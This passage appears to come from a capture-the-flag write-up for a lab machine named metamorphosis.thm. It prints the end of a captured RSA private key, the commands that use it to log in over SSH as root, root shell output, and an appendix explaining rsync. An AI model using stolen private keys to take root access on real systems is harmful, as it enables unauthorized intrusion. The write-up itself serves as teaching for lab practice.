9o7WHF2hAoGBAOPxNWc3vH18qu3WC6eMphPdYOaGBjbNBOgzJxzh/evxpSwRSG9V
63gNgKJ8zccQff/HH1n54VS+tuF7RCykRNb+Ne7K/uiDe1TpOKEMi7XtXOYHy5s1
tykL0OPdSs4hN1jMJjkSfPgdNPmxM3bbJMHDPjdQXAK6DnXmOCETaPAnAoGBAOFm
Fhqv8OREYFq+h1mDzMJn5WsNQQZnvvetJR7g3gfKcVblwMhlh504Tf3o00OGCKC1
L4iWMNb6uitKfTmGNta5X8ChWSVxXbb9fOWCOudNGt/fb70SK6fK9CSl66i/niIw
cIcu0tpS/T3MoqwMiGk87ivtW3bK20TsnY0tX3KVAoGAEeJdBEo1OctMRfjjVTQN
28Uk0zF0z1vqpKVOzk9U8uw0v25jtoiRPwwgKZ+NLa83k5f198NJULLd+ncHdFE3
LX8okCHROkEGrjTWQpyPYajL/yhhaz4drtTEgPxd4CpvA0KRRS0ULQttmqGyngK3
sZQ2D3T4oyYh+FIl2UKCm0UCgYEAyiHWqNAnY02+ayJ6FtiPg7fQkZQtQCVBqLNp
mqtl8e6mfZtEq3IBkAiySIXHD8Lfcd+KZR7rZZ8r3S7L5g5ql11edU08uMtVk4j3
vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
-----END RSA PRIVATE KEY-----
```

`chmod 600 rootid`

`ssh -i rootid root@metamorphosis.thm -p 22`

```jsx
root@incognito:~# whoami
root
root@incognito:~# id
uid=0(root) gid=0(root) groups=0(root)
root@incognito:~# pwd
/root
root@incognito:~#
```

# Appendix

## Remote Synchronization (rsync)

<aside>
💡

Remote Synchronization (rsync) is a utility and protocol used for efficiently synchronizing files and directories between two locations, either on the same machine or across a network. It is a popular tool for backups, mirroring, and file synchronization due to its speed, versatility, and efficiency.

</aside>